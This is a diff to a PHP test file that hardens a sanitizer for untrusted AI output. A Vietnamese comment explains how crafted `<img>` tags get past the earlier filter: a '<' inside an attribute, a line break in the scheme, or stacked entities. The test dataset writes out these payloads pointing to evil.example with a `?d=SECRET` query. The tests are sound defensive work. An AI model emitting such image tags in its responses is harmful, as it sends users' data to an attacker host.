@@ -298,6 +298,49 @@ it('leaves ordinary brackets and parentheses alone', function () {
         ->toBe('Điều 5 [đã sửa] (xem dưới), mục [1] và [2].');
 });
 
+/*
+|--------------------------------------------------------------------------
+| Vòng sửa 2 của Task 9 (duyệt lại I1): thẻ HTML mà mẫu thẻ không thấy
+|--------------------------------------------------------------------------
+|
+| Mẫu thẻ ở bước 4 (`<…>` không chứa `<`) không thấy một thẻ có `<` trong giá trị thuộc tính, cũng
+| không thấy một thẻ chưa đóng (một `>` về sau trong câu trả lời của AI đóng nó). Bước URL không thấy
+| `https` + xuống dòng + `://` (WHATWG bỏ xuống dòng khỏi URL, ra `https://evil.example`) hay một lớp
+| thực thể thứ tư (trình duyệt giải mã nốt lớp đó trong giá trị thuộc tính). Người duyệt lại cho hai
+| `<img>` như thế ra vẫn là một `<img>` trỏ về máy kẻ tấn công (cái đầu nguyên từng byte, cái sau chỉ
+| còn lớp thực thể cuối). Chặn cuối chèn một dấu cách sau mọi `<` đứng ngay trước chữ cái
+| ASCII, `!`, `?` hay `/`: không có một trong các ký tự đó ngay sau `<` thì trình duyệt không mở thẻ,
+| thẻ đóng, chú thích, khai báo hay chỉ thị nào, và CommonMark không có HTML thô hay autolink URL
+| nào (autolink email mở bằng chữ số hay dấu, `<5a@b.example>`, vẫn là link `mailto:` như email trần).
+*/
+dataset('task 9 re-review tag payloads', [
+    'a "<" in an attribute, a line break inside the scheme' => [
+        "<img alt=\"<\" src=\"https\n://evil.example/p.png?d=SECRET\">",
+        "< img alt=\"<\" src=\"https\n://evil.example/p.png?d=SECRET\">",
+    ],
+    'a "<" in an attribute, four layers of entities in the URL' => [
+        '<img alt="<" src="https&amp;amp;amp;#58;&amp;amp;amp;#47;&amp;amp;amp;#47;evil.example/p.png?d=SECRET">',
+        '< img alt="<" src="https&#58;&#47;&#47;evil.example/p.png?d=SECRET">',
+    ],
+    'an upper-case tag name' => ['<IMG alt="<" src=p.png>', '< IMG alt="<" src=p.png>'],
+    'a tag left open, for a later ">" to close' => ['Xem <img src=p.png', 'Xem < img src=p.png'],
+    'an end tag' => ['</a title="<">', '< /a title="<">'],
+    'a markup declaration' => ['<!x "<">', '< !x "<">'],
+    'a processing instruction' => ['<?x "<"?>', '< ?x "<"?>'],
+    'a letter right after "<" in ordinary text' => ['a<b và x<y', 'a< b và x< y'],
+]);
+
+it('breaks every "<" that could still open a tag, so no HTML tag, comment or URL autolink is left', function (string $raw, string $expected) {
+    $out = untrusted($raw)['text'];
+
+    expect(preg_match('/<[a-z!?\/]/i', $out))->toBe(0)
+        ->and($out)->toBe($expected);
+})->with('task 9 re-review tag payloads');
+
+it('keeps a "<" that no tag can start with: before a digit, a space or a sign', function () {
+    expect(untrusted('giá <5 triệu, a <= b, <3 và < 2')['text'])->toBe('giá <5 triệu, a <= b, <3 và < 2');
+});
+
 it('fails closed when a regular expression cannot run: nothing, rather than the text unfiltered', function () {
     $jit = ini_get('pcre.jit');
     $limit = ini_get('pcre.backtrack_limit');
